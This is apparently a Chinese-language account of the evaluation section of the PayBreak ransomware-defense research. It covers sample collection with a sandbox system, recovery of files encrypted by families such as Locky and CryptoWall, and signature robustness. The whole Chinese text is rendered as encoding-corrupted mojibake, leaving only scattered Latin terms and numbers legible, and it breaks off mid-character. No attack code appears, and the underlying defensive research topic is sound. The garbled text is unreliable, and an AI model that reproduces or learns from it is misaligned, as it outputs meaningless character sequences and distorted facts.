PayBreakå¯ä»¥ä¿æŠ¤ç”¨æˆ·å…å—çœŸå®çš„å‹’ç´¢è½¯ä»¶çš„å¨èƒå—ï¼Ÿï¼ˆå³PayBreakæ˜¯å¦å¯ä»¥è¿˜åŸç”±å¸‚é¢ä¸Šæµé€šçš„å‹’ç´¢è½¯ä»¶åŠ å¯†çš„æ–‡ä»¶ï¼‰ RQ2 æ˜¯å¦éœ€è¦å¯¹è½¯ä»¶è¿›è¡Œç‰¹å®šçš„ä¿®æ”¹æ‰èƒ½è¿˜åŸä¸åŒå‹’ç´¢è½¯ä»¶é‡‡ç”¨çš„åŠ å¯†ï¼Ÿ RQ3 å°†PayBreakä½œä¸ºä¸€ç§å®æ—¶çš„åœ¨çº¿ä¿æŠ¤æœºåˆ¶è¿è¡Œä¼šå¯¹æ€§èƒ½äº§ç”Ÿä»€ä¹ˆå½±å“ï¼Ÿ è¿™äº›é—®é¢˜æ—¨åœ¨å›ç­”æ‰€æå‡ºæŠ€æœ¯çš„å®ç”¨æ€§é—®é¢˜ã€‚ RQ1ç€é‡è¯¥æŠ€æœ¯æ˜¯å¦æœ‰æ•ˆã€‚ æ˜¾ç„¶ï¼Œä¸€ä¸ªä¸èƒ½å®Œæˆé¢„å®šåŠŸèƒ½çš„ç³»ç»Ÿåœ¨å¯¹æŠ—å‹’ç´¢è½¯ä»¶æ–¹é¢çš„å¸®åŠ©æœ‰é™ã€‚ RQ2æ¢ç´¢äº†æ‰€æå‡ºç³»ç»Ÿçš„å¤šåŠŸèƒ½æ€§ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šç”¨æ–¹æ³•æ¯”éœ€è¦ä¸æ–­å®Œå–„ä»¥è§£å†³ä»¥å‰æœªçŸ¥çš„å‹’ç´¢è½¯ä»¶ç³»åˆ—æ‰€é¢ä¸´çš„æŒ‘æˆ˜çš„æŠ€æœ¯æ›´ä¸ºå¯å–ã€‚ æœ€åï¼ŒRQ3è§£å†³äº†ä¸€ä¸ªå®é™…çš„éƒ¨ç½²é—®é¢˜ã€‚ ä¸æµè¡Œçš„é˜²ç—…æ¯’è§£å†³æ–¹æ¡ˆç±»ä¼¼ï¼Œæˆ‘ä»¬å°†PayBreakè®¾è®¡ä¸ºä¸€ç§åœ¨çº¿ä¿æŠ¤æœºåˆ¶ï¼Œå› æ­¤ï¼Œå¯¹å¸¸è§ç”¨ä¾‹å’Œå·¥ä½œè´Ÿè½½çš„é«˜æ€§èƒ½å½±å“å°†å¯¹åœ¨å·¥ä½œç¯å¢ƒé‡‡ç”¨è¿™ç§æœºåˆ¶æ„æˆé‡å¤§éšœç¢ã€‚ Datasetä¸ºäº†æµ‹è¯•PayBreakçš„åŠŸèƒ½å’Œæœ‰æ•ˆæ€§ï¼Œæˆ‘ä»¬éœ€è¦è·å–ä¸»åŠ¨åŠ å¯†å‹’ç´¢è½¯ä»¶çš„æ ·æœ¬ã€‚ ä¸ºäº†æ”¶é›†è¿™äº›æ ·æœ¬ï¼Œæˆ‘ä»¬å¼€å‘äº†å®æ—¶è‡ªåŠ¨åŒ–çš„å‘ç°ï¼Œæ£€æµ‹å’Œè­¦å‘Šå‹’ç´¢è½¯ä»¶ï¼ˆRADDARï¼‰ç³»ç»Ÿã€‚ è¯¥é¡¹ç›®å°†è¢«å¼€æºï¼Œä»¥å¸®åŠ©è¿›ä¸€æ­¥ç ”ç©¶å‹’ç´¢è½¯ä»¶ã€‚ RADDARä¼šåœ¨å„ä¸ªä½ç½®æŠ“å–æ¶æ„è½¯ä»¶æ ·æœ¬ã€‚ æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬ä»VirusTotal Intelligenceè·å¾—äº†æ ·æœ¬ï¼Œè¯¥æ ·æœ¬æä¾›äº†é’ˆå¯¹æ¶æ„è½¯ä»¶æ ·æœ¬çš„é«˜çº§æœç´¢åŠŸèƒ½å’Œä¸‹è½½åŠŸèƒ½ã€‚ æˆ‘ä»¬æœç´¢äº†æ–°æäº¤çš„æ ·æœ¬ï¼ˆå³åœ¨åˆ†æåä¸€å‘¨å†…æäº¤çš„æ ·æœ¬ï¼‰ï¼Œè¿™äº›æ ·æœ¬ä¹Ÿè¢«è‡³å°‘ä¸¤ä¸ªåç—…æ¯’ä¾›åº”å•†æ ‡è®°ï¼Œå¹¶ä¸”åŒ…å«åœ¨List of Known Ransomware Familiesä¸­ã€‚é™¤äº†è¿™äº›æµè¡Œçš„å‹’ç´¢è½¯ä»¶ç³»åˆ—ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜ä¸‹è½½äº†åŸºäºé€šç”¨æœç´¢è¯çš„ç¤ºä¾‹ï¼šå‹’ç´¢ï¼ŒåŠ å¯†æˆ–é”å®šã€‚é™¤VirusTotalå¤–ï¼Œæˆ‘ä»¬è¿˜å¯¹å„ç§æ¶æ„è½¯ä»¶å­˜å‚¨åº“è¿›è¡Œäº†çˆ¬å–ï¼ŒåŒ…æ‹¬Malc0deå’ŒVXVaultã€‚ RADDARä¸€æ—¦å‘ç°æ¶æ„è½¯ä»¶æ ·æœ¬ï¼Œå°±ä¼šæ£€æµ‹è¯¥æ¶æ„è½¯ä»¶æ ·æœ¬æ˜¯å¦ä¸ºåŸºäºåŠ å¯†çš„å‹’ç´¢è½¯ä»¶ï¼Œä»¥åŠæ˜¯å¦æ­£åœ¨æ‰§è¡Œå…¶æ¶æ„è¡Œä¸ºã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†Cuckoo SandboxåŠ¨æ€åˆ†ææ¡†æ¶ï¼Œå…¶ä¸­æ¯ä¸ªæ ·æœ¬è¿è¡Œ20åˆ†é’Ÿã€‚ æˆ‘ä»¬ä½¿ç”¨Cuckooé€šè¿‡åœ¨KVM8ä¸­è¿è¡Œçš„å—ç›‘è§†Windows 7è™šæ‹Ÿæœºï¼ˆVMï¼‰ä¸­æ‰§è¡Œæ¯ä¸ªæ ·æœ¬æ¥åˆ†æå¹¶è¾“å‡ºæ¯ä¸ªæ ·æœ¬çš„è¡Œä¸ºæŠ¥å‘Šã€‚æ­¤å¤–ï¼Œé™¤äº†åœ¨çº¯å‡€çš„Windows 7å®‰è£…åŒ…ä¸­æ‰¾åˆ°çš„é»˜è®¤æ–‡ä»¶ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜é€šå¸¸åœ¨è®¡ç®—æœºä¸Šçš„å„ä¸ªç›®å½•ä¸­æ”¾ç½®ç»è¿‡é‡æ–°å°è£…çš„æ–‡ä»¶ç±»å‹ï¼ˆPDFï¼Œå›¾åƒï¼Œæºä»£ç å’ŒWordæ–‡æ¡£ï¼‰ã€‚ æœ€åï¼Œæˆ‘ä»¬åœ¨è™šæ‹Ÿæœºä¸­æ·»åŠ äº†PayBreakï¼Œè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œæ­¤è¯„ä¼°ä¸­ä»‹ç»çš„æµ‹è¯•ã€‚ æˆ‘ä»¬æ‹æ‘„äº†æ–‡ä»¶ç³»ç»Ÿçš„å¿«ç…§ï¼Œå¹¶å°†åœ¨æ„ŸæŸ“ä¹‹å‰åœ¨ç³»ç»Ÿä¸Šæ‰¾åˆ°çš„è¿™äº›æ–‡ä»¶ç§°ä¸ºâ€œhoney filesâ€ï¼ˆèœœç½ï¼‰ã€‚ åœ¨ç”±Cuckooåˆ†ææ¶æ„è½¯ä»¶æ ·æœ¬ä¹‹åï¼ŒRADDARä¼šå¯¹Cuckooç»“æœè¿›è¡Œåˆ†æï¼Œä»¥ç”ŸæˆåŒ…å«å„ç§æŒ‡æ ‡çš„æŠ¥å‘Šï¼Œå…¶ä¸­åŒ…æ‹¬æ ·æœ¬æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ä»¥åŠPayBreakæ˜¯å¦æå–äº†åŠ å¯†æœŸé—´ä½¿ç”¨çš„å¯†é’¥ã€‚ åŸºäºä»¥ä¸‹ç‰¹å¾ï¼Œæˆ‘ä»¬è®¤ä¸ºå‹’ç´¢è½¯ä»¶æ ·æœ¬å¤„äºæ´»åŠ¨çŠ¶æ€ï¼š è¦†ç›–ï¼Œåˆ é™¤æˆ–é‡æ–°åˆ›å»ºè‡³å°‘ä¸€ä¸ªhoney file æ–°æ–‡ä»¶è¢«libmagicæ ‡è¯†ä¸ºæ•°æ®ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œlibmagicå·²ç»æˆåŠŸæ ‡è¯†äº†åŸå§‹çŠ¶æ€ä¸‹honey filesçš„çœŸå®å†…å®¹ï¼Œå› æ­¤ï¼Œå¦‚æœç±»å‹æ›´æ”¹ä¸ºæ•°æ®ï¼Œåˆ™æ ·æœ¬å¿…é¡»å·²å¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹ã€‚ ä¸ºäº†ç¡®å®šå‹’ç´¢è½¯ä»¶çš„å®¶æ—ï¼Œæˆ‘ä»¬å¯¹AVæ ‡ç­¾è¿›è¡Œäº†å¤šæ•°è¡¨å†³ï¼ˆå³é‡‡ç”¨ä¸Kharrazç­‰äººç›¸åŒçš„æ–¹æ³•[5]ï¼‰ã€‚æˆ‘ä»¬è®©RADDARè¿è¡Œäº†4ä¸ªæœˆï¼Œä»¥æ”¶é›†å’Œç”Ÿæˆæœ‰å…³1,691ä¸ªæ¶æ„è½¯ä»¶æ ·æœ¬çš„æŠ¥å‘Šï¼Œå…¶ä¸­713ä¸ªä¸AVå…¬å¸ä½¿ç”¨çš„å‹’ç´¢è½¯ä»¶æ ‡ç­¾åŒ¹é…ã€‚ ä¸‹å›¾ç»™å‡ºäº†è¯¥åˆ†æçš„è¯¦ç»†åˆ†ç±»ã€‚ ä¸ä¹‹å‰çš„æ¶æ„è½¯ä»¶ç ”ç©¶ä¸€è‡´ï¼Œæˆ‘ä»¬æ•°æ®é›†ä¸­çš„è®¸å¤šæ ·æœ¬ç”±äºå„ç§åŸå› æ²¡æœ‰æ˜¾ç¤ºä»»ä½•æ¶æ„åŠŸèƒ½ï¼ˆå³ï¼Œå®ƒä»¬å¤„äºéæ´»åŠ¨çŠ¶æ€ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿›è¡Œäº†ä»¥ä¸‹ä¸¤æ­¥åˆ†æã€‚é¦–å…ˆï¼Œè¯†åˆ«æ´»åŠ¨æ ·æœ¬ï¼Œç„¶åå°è¯•æ¨æ–­éæ´»åŠ¨æ ·æœ¬æœªæ˜¾ç¤ºä»»ä½•æ¶æ„è¡Œä¸ºçš„åŸå› ã€‚å¦‚å‰æ‰€è¿°ï¼Œå®‰å…¨ä½¿ç”¨æ··åˆåŠ å¯†çš„å‹’ç´¢è½¯ä»¶å¿…é¡»ä»å‘½ä»¤å’Œæ§åˆ¶ç»“æ„ï¼ˆC&amp;Cï¼‰æ£€ç´¢å…¬é’¥pkã€‚å› æ­¤ï¼Œå¦‚æœæ¶æ„è½¯ä»¶ä¸äº§ç”Ÿä»»ä½•ç½‘ç»œæµé‡ï¼Œå°±æ— æ³•å®‰å…¨åœ°åº”ç”¨æ··åˆåŠ å¯†ã€‚å¦‚æœæ‰€æœ‰è§‚å¯Ÿåˆ°çš„TCPå’ŒUDPæµé‡éƒ½ä¸“é—¨é’ˆå¯¹Windowsé™„å±çš„åŸŸï¼ˆä¾‹å¦‚ç”¨äºè®¡æ—¶å’Œæ›´æ–°çš„åŸŸï¼‰ï¼Œåˆ™æˆ‘ä»¬å°†æ ·æœ¬åˆ†ç±»ä¸ºâ€œæ— ç½‘ç»œâ€ã€‚ æ­¤å¤–ï¼Œå¦‚æœæ‰€æœ‰DNSæŸ¥è¯¢ï¼ˆé’ˆå¯¹MicrosoftåŸŸçš„æŸ¥è¯¢é™¤å¤–ï¼‰éƒ½è¿”å›å¦ï¼Œæˆ–è€…æ‰€æœ‰HTTPè¯·æ±‚å‡ç”Ÿæˆ404çŠ¶æ€ä»£ç ï¼Œåˆ™å°†æ ·æœ¬åˆ†ç±»ä¸ºâ€œå·²ç¦ç”¨Cï¼†Câ€ã€‚åœ¨åˆ†æçš„éæ´»åŠ¨æ ·æœ¬ä¸­ï¼Œé‚£äº›æŠ¥å‘Šä¸ºå…·æœ‰ç¦ç”¨çš„Cï¼†Cçš„æ ·æœ¬éƒ½æ˜¯ç”±äºDNSæŸ¥è¯¢è¿”å›é”™è¯¯ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯¹ç”±æ¶æ„è½¯ä»¶ç”Ÿæˆçš„å—HTTPSä¿æŠ¤çš„ç½‘ç»œæµé‡è¿›è¡Œåˆ†æã€‚æœ€åï¼Œå³ä½¿Cï¼†Cå¯æ“ä½œä¸”å¯è®¿é—®ï¼Œä½†å¦‚æœæ£€æµ‹åˆ°ç¯å¢ƒæ•æ„Ÿå‹æ¶æ„è½¯ä»¶åœ¨æ²™ç›’ç¯å¢ƒä¸­è¿è¡Œï¼Œå®ƒä¹Ÿå°†é¿å…æ‰§è¡Œã€‚ â€œEnvironmentâ€è¡¨ç¤ºæ¶æ„è½¯ä»¶å¯èƒ½æ­£åœ¨åˆ†æå…¶ç¯å¢ƒä»¥æ£€æµ‹å…¶æ˜¯å¦åœ¨è™šæ‹Ÿç¯å¢ƒï¼ˆä¾‹å¦‚KVMæˆ–VirtualBoxï¼‰ä¸­è¿è¡Œã€‚ å¦‚æœCuckooçš„å†…ç½®æ£€æµ‹ç¨‹åºå°†æ ·æœ¬æ ‡è¯†ä¸ºâ€œEnvironmentâ€ï¼Œåˆ™è¯¥æ ·æœ¬å°†è¢«æ ‡è®°ä¸ºâ€œEnvironmentâ€ã€‚ è‡³äºæ— æ³•ç¡®å®šå…¶ä½™æ ·å“æ²¡æœ‰è¿è¡Œçš„åŸå› ï¼Œä»¥å‰çš„ç»éªŒè¡¨æ˜ï¼Œè¿™å¯èƒ½æ˜¯ç”±äºæ›´é«˜çº§çš„ç¯å¢ƒæŒ‡çº¹è¯†åˆ«ï¼Œå¯¹ç”¨æˆ·æ´»åŠ¨çš„ä¾èµ–æ€§æˆ–é€»è¾‘ï¼ˆå®šæ—¶ï¼‰ç‚¸å¼¹çš„ä½¿ç”¨è€Œå¯¼è‡´æ‰§è¡Œå»¶è¿Ÿè¶…è¿‡æˆ‘ä»¬çš„20åˆ†é’Ÿè¯„ä¼°é˜ˆå€¼ã€‚æœ€åï¼Œæˆ‘ä»¬é’ˆå¯¹20ä¸ªæ´»è·ƒçš„å‹’ç´¢è½¯ä»¶ç³»åˆ—è¯„ä¼°äº†æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œè¿™æ˜¯æˆ‘ä»¬æ‰€çŸ¥é“çš„æœ€å¤§çš„å‹’ç´¢è½¯ä»¶ç ”ç©¶ã€‚ PayBreak Effectivenessåœ¨æœ¬éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å›ç­”RQ1ï¼ŒPayBreakå¯ä»¥è¿˜åŸçœŸå®å‹’ç´¢è½¯ä»¶æ‰§è¡Œçš„åŠ å¯†å—ï¼Ÿå’ŒRQ2ä¸€æ ·ï¼Œæ˜¯å¦éœ€è¦å¯¹æ¶æ„è½¯ä»¶å®¶æ—è¿›è¡Œç‰¹å®šçš„ä¿®æ”¹æ‰èƒ½è¿˜åŸä¸åŒå‹’ç´¢è½¯ä»¶å®¶æ—é‡‡ç”¨çš„åŠ å¯†ï¼Ÿ PayBreakèƒ½å¤Ÿä»å…·æœ‰å·²çŸ¥åŠ å¯†ç­¾åçš„æ‰€æœ‰å‹’ç´¢è½¯ä»¶ç³»åˆ—ä¸­æ¢å¤è¢«å‹’ç´¢çš„æ–‡ä»¶ã€‚æˆ‘ä»¬çš„ç»“æœè¯å®ï¼Œæˆ‘ä»¬èƒ½å¤ŸæˆåŠŸèå…¥ç°å®å‹’ç´¢è½¯ä»¶æ ·æœ¬çš„åŠ å¯†åŠŸèƒ½å¹¶æå–ä¼šè¯å¯†é’¥ä»¥åŠç”¨äºæ–‡ä»¶æ¢å¤çš„æ‰€æœ‰å¿…è¦ææ–™ã€‚æ›´å…·ä½“åœ°è¯´ï¼ŒPayBreakå‡»è´¥äº†20ä¸ªæ´»è·ƒå‹’ç´¢è½¯ä»¶å®¶æ—ä¸­çš„12ä¸ªï¼Œæ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œå…¶ä¸­9ä¸ªä»¥å‰ä»æœªè¢«å‡»è´¥ã€‚å¦‚æœå­˜åœ¨å¯ä»¥å®Œå…¨æ¢å¤è¢«å‹’ç´¢æ–‡ä»¶çš„æ–¹æ³•æˆ–æŠ€æœ¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå‹’ç´¢è½¯ä»¶å°±æ˜¯å¤±è´¥çš„ã€‚PayBreakæˆåŠŸæ¢å¤äº†ç”±CryptoWallå’ŒLockyåŠ å¯†çš„æ–‡ä»¶ï¼ŒLockyæ˜¯2016å¹´åœ¨ç»æµä¸Šæœ€æˆåŠŸçš„ä¸‰ä¸ªå‹’ç´¢è½¯ä»¶ç³»åˆ—ä¸­çš„ä¸¤ä¸ªï¼Œè€Œä»…CryptoWallä¾¿è·å¾—äº†è¶…è¿‡3.25äº¿ç¾å…ƒçš„æ”¶å…¥ã€‚ ä¸‹è¡¨ä¸­æ˜¾ç¤ºäº†æ´»è·ƒå‹’ç´¢è½¯ä»¶ç³»åˆ—çš„æ‘˜è¦ã€‚ç»™å®šç³»åˆ—çš„æ´»è·ƒå‹’ç´¢è½¯ä»¶æ•°é‡åœ¨Samplesåˆ—ä¸­æŒ‡å®šã€‚å¯¹äºä»¥å‰è¢«å‹’ç´¢çš„å‹’ç´¢è½¯ä»¶æ ·æœ¬ï¼Œè¯¥åˆ—ä¸­åŒ…å«ç›¸åº”çš„å‚è€ƒã€‚æˆ‘ä»¬ä¸è®¤ä¸ºæ³„æ¼çš„åŠ å¯†å¯†é’¥ï¼ˆä¾‹å¦‚ä»æ”»å‡»è€…çš„æœåŠ¡å™¨è·å¾—ï¼‰æ˜¯å¤±è´¥çš„ï¼Œå› ä¸ºè¿™æ˜¯é’ˆå¯¹å‹’ç´¢è½¯ä»¶çš„æ´»åŠ¨ï¼Œå¹¶ä¸æ„å‘³ç€å‹’ç´¢è½¯ä»¶ç³»åˆ—çš„å®æ–½ä¸åŠ›ã€‚PayBreakå±•ç¤ºäº†ä½¿ç”¨å¤šç§åŠ å¯†åº“ï¼ˆåŒ…æ‹¬Microsoft CryptoAPIå’ŒCrypto++ï¼‰å‡»è´¥å‹’ç´¢è½¯ä»¶çš„èƒ½åŠ›ã€‚ PayBreakåœ¨è¿è¡Œæ—¶ä¸ºPayBreakæˆåŠŸçš„æ ·æœ¬æå–äº†ç”¨äºåŠ å¯†çš„åŠ å¯†ç®—æ³•ï¼Œå¹¶åœ¨â€œç®—æ³•â€åˆ—ä¸­åˆ—å‡ºã€‚å¯¹äºæœªæˆåŠŸçš„æ ·æœ¬ï¼Œè¯¥åˆ—åŒ…å«å…¶ä»–ç ”ç©¶äººå‘˜ç ”ç©¶çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯æˆ‘ä»¬å°½å¯èƒ½æ”¶é›†çš„ï¼Œå¹¶æä¾›äº†ç›¸åº”çš„å‚è€ƒã€‚æ­¤å¤–ï¼Œâ€œå‡»è´¥â€åˆ—è¿˜æ ‡è¯†äº†é€šè¿‡å…ˆå‰æŠ€æœ¯æˆ–PayBreakè¢«å‡»è´¥çš„æ‰€æœ‰è½¯ä»¶ã€‚ åœ¨æˆ‘ä»¬çš„æ ·æœ¬åº“ä¸­çš„20ä¸ªæ´»è·ƒå®¶åº­ä¸­ï¼ŒPayBreakå¤±è´¥äº†8ä¸ªã€‚å…¶ä¸­çš„ä¸‰ä¸ªDXXDï¼ŒPokemonGoå’ŒVirLockå…ˆå‰è¢«å‡»è´¥ï¼Œå…¶ä½¿ç”¨çç¢çš„å¸¸é‡å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œå³å®ƒä»¬æœªä½¿ç”¨æ··åˆåŠ å¯†ã€‚å¦å¤–ä¸¤ä¸ªå®¶åº­ï¼ŒMarsJokeså’ŒTroldeshï¼Œä¹Ÿå…ˆå‰è¢«å‡»è´¥ã€‚ä¸æµè¡Œçš„æ–¹å¼ç›¸åï¼Œè¿™äº›ç³»åˆ—ä½¿ç”¨äº†è‡ªå·±çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»è¿‡äº†å®æˆ˜æµ‹è¯•çš„CryptGenRandom APIã€‚å…¶ä½™æ²¡æœ‰æˆåŠŸçš„è½¯ä»¶å®¶æ—ï¼ŒAndromï¼ŒRazyå’ŒTeslaCryptä½¿ç”¨ä¸€ä¸ªå¯†ç åº“ï¼Œè€Œæˆ‘ä»¬çš„åŸå‹å®ç°å¹¶æœªè®¾ç½®ä¸ºå¯hookçš„ã€‚ PayBreakå¯ä»¥æ‰©å±•ï¼Œä»¥é€šè¿‡hookingå®ƒä»¬å„è‡ªçš„é™æ€é“¾æ¥çš„åŠ å¯†åŠŸèƒ½ï¼Œç„¶åå°†å…¶æ’å®šå¯†é’¥ï¼ˆå¯¹äºçç¢çš„å®¶æ—ï¼‰å¯¼å‡ºï¼Œæˆ–å°†å…¶ä¼šè¯å¯†é’¥å¯¼å‡ºåˆ°å¯†é’¥åº“ä¸­ï¼Œä»è€Œå‡»è´¥å…¶ä½™å…«ä¸ªå®¶æ—ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®¨è®ºç³»ç»Ÿæ‰€ä½¿ç”¨ç­¾åçš„é²æ£’æ€§ã€‚ Signature Robustnessä¸ºäº†è¯†åˆ«é™æ€é“¾æ¥çš„åŠ å¯†åº“ï¼ŒPayBreakä¾èµ–äºç­¾åã€‚å› æ­¤ï¼Œä¸€ä¸ªæ˜æ˜¾çš„é—®é¢˜æ˜¯è¿™äº›ç­¾åå¯¹æ··æ·†çš„é²æ£’æ€§ã€‚ä¸æ‰€æœ‰å®ç”¨çš„åœ¨çº¿åæ¶æ„è½¯ä»¶å…æ€æ–¹æ¡ˆä¸€æ ·ï¼Œè¶³å¤Ÿçº§åˆ«çš„æ··æ·†å’Œæ¬ºéª—å¯ä»¥è§„é¿PayBreakæä¾›çš„ä¿æŠ¤ã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œè¿è¡Œæ—¶è„±å£³çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ä¼šå¯¹PayBreaké€ æˆé—®é¢˜ã€‚ä¸ºäº†è¯„ä¼°ç­¾åçš„é²æ£’æ€§ï¼Œæˆ‘ä»¬æ ¹æ®ä¸åŒç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«å¼•å…¥çš„è¯­æ³•æ›´æ”¹æ¥è¯„ä¼°å®ƒä»¬ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥è½»æ¾æ›´æ”¹è¿™äº›ç‰¹å¾ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ç¼–è¯‘äº†12ä¸ªç¨‹åºï¼Œè¿™äº›ç¨‹åºä½¿ç”¨å…·æœ‰ä¸åŒç¼–è¯‘å™¨å’Œä¼˜åŒ–è®¾ç½®çš„Crypto++åŠ å¯†åº“ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬çš„ç¤ºä¾‹ç¨‹åºé™æ€é“¾æ¥äº†Crypto++ç‰ˆæœ¬5.6.3ã€5.6.2å’Œ5.6.1ï¼ŒåŒ…å«äº†è¿™ä¸ªæµè¡Œçš„WindowsåŠ å¯†åº“å¼€å‘çš„äº”å¹´æ—¶é—´ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä½¿ç”¨tdm-gccå’Œmingw32-gccç¼–è¯‘å™¨ç¼–è¯‘äº†ç¨‹åºï¼Œæ¯ä¸ªç¼–è¯‘å™¨éƒ½å…·æœ‰ç¦ç”¨çš„ä¼˜åŒ–åŠŸèƒ½å’Œæœ€å¤§ä¼˜åŒ–çº§åˆ«ã€‚è¦è¯†åˆ«åŠ å¯†åŠŸèƒ½çš„æ‰€æœ‰12ä¸ªå˜ä½“ï¼Œæˆ‘ä»¬å¿…é¡»å¼€å‘ä¸¤ä¸ªç­¾åã€‚åŸå› æ˜¯ï¼Œä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å™¨æ—¶ï¼Œå·¥ä»¶ä¹‹é—´çš„å·®å¼‚å¾ˆå¤§ï¼Œä½†å¯¹äºä¸åŒçš„ä¼˜åŒ–çº§åˆ«ï¼Œå·®å¼‚å°±è¾ƒå°ã€‚æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªç¼–è¯‘å™¨åˆ›å»ºä¸€ä¸ªç­¾åï¼Œå¹¶ä¸”æ¯ä¸ªç­¾ååœ¨æ‰€æœ‰ç»è¿‡æµ‹è¯•çš„ä¼˜åŒ–çº§åˆ«å’Œåº“ç‰ˆæœ¬ä¸­éƒ½æ˜¯å¯é çš„ã€‚ File RecoveryPayBreakèƒ½å¤Ÿä»åäºŒä¸ªè½¯ä»¶ä¸­å®Œå…¨æ¢å¤åŠ å¯†æ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬æ­£åœ¨å¤„ç†å¤§é‡æ ·æœ¬ï¼Œå› æ­¤æˆ‘ä»¬çš„RADDARç³»ç»Ÿåªä¼šæ‰§è¡Œæ¯ä¸ªæ ·æœ¬20åˆ†é’Ÿã€‚ä½†æ˜¯ï¼Œä¸ºäº†è¯„ä¼°æ€§èƒ½å’Œæ¢å¤æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œæˆ‘ä»¬åœ¨å¯é‡ç½®çš„æµ‹è¯•ç¯å¢ƒä¸­æ‰§è¡Œäº†å››ä¸ªå‹’ç´¢è½¯ä»¶ç³»åˆ—ï¼Œæ¯ä¸ªç³»åˆ—è¿è¡Œäº†å››ä¸ªå°æ—¶ã€‚ä¸ºäº†å¼€å‘æ­¤æµ‹è¯•ç¯å¢ƒï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬åœ¨æ•´ä¸ªè™šæ‹Ÿæœºçš„æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­éšæœºåˆ†å¸ƒäºæ ‡å‡†åŒ–æ–‡æ¡£åº“Govdocs1çº¿ç¨‹ã€‚æ–‡æ¡£è¯­æ–™åº“åŒ…å«9,876ä¸ªæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¸»è¦æ˜¯å¸¸è§çš„åŠå…¬ç±»å‹ï¼Œä¾‹å¦‚.xlsï¼Œ.docxå’Œ.pdfã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬è®°å½•å…¶åŸå§‹SHA1æ–‡ä»¶å“ˆå¸Œã€‚é€šè¿‡æ¯”è¾ƒè¿™äº›æ–‡ä»¶å“ˆå¸Œï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šæˆ‘ä»¬æ¢å¤çš„æ–‡ä»¶æ˜¯å¦ä¸ºåŸå§‹æ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘ä»¬æ‰§è¡Œäº†ä¸€ä¸ªå‹’ç´¢è½¯ä»¶å®¶æ—ï¼Œå¹¶åœ¨æ²¡æœ‰å¹²é¢„çš„æƒ…å†µä¸‹è¿è¡Œäº†å››ä¸ªå°æ—¶ã€‚æ„ŸæŸ“å®Œæˆåï¼Œæˆ‘ä»¬å°†ç³»ç»Ÿä¸Šçš„æ‰€æœ‰æ–‡ä»¶æå–åˆ°å®‰å…¨çš„ç¯å¢ƒä¸­ã€‚ PayBreakå°è¯•ä½¿ç”¨ä»ç³»ç»Ÿä¸­æå–çš„å¯†é’¥ä¿é™©åº“æ¢å¤è¿™äº›æ–‡ä»¶ã€‚ç„¶åï¼Œæˆ‘ä»¬é‡ç½®è™šæ‹Ÿæœºï¼Œå¹¶å¯¹æ¯ä¸ªç³»åˆ—é‡å¤æ­¤è¿‡ç¨‹ã€‚ åœ¨å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œå‹’ç´¢è½¯ä»¶åŠ å¯†ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œäº†PayBreakè§£å¯†ã€‚æˆ‘ä»¬çš„ç³»ç»Ÿèƒ½å¤Ÿä»æ¯ç§æ”»å‡»ä¸­æ¢å¤100ï¼…çš„åŸå§‹åŠ å¯†æ–‡ä»¶ã€‚ä¸å…ˆå‰ç”Ÿæˆçš„åŸå§‹æ–‡ä»¶å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒå¯¹äºæ¢å¤ä¸æ˜¯å¿…éœ€çš„ï¼Œä½¿ç”¨å…ˆå‰ç”Ÿæˆçš„æ–‡ä»¶å“ˆå¸Œå€¼ä»…å¯ä½œä¸ºæˆåŠŸæ–‡ä»¶æ¢å¤çš„ç¡®è®¤ã€‚ Lockyæ ·æœ¬å¯¹9,821ä¸ªæ–‡ä»¶è¿›è¡Œäº†åŠ å¯†ï¼Œå¹¶åœ¨360m40så†…æ¢å¤äº†æ–‡ä»¶ã€‚ Cryptowallæ ·æœ¬å¯¹æ–‡æ¡£è¯­æ–™åº“ä¸­çš„204ä¸ªæ–‡ä»¶è¿›è¡Œäº†åŠ å¯†ï¼Œå¹¶åœ¨86så†…æ¢å¤äº†æ–‡ä»¶ã€‚AlmaLockeræ 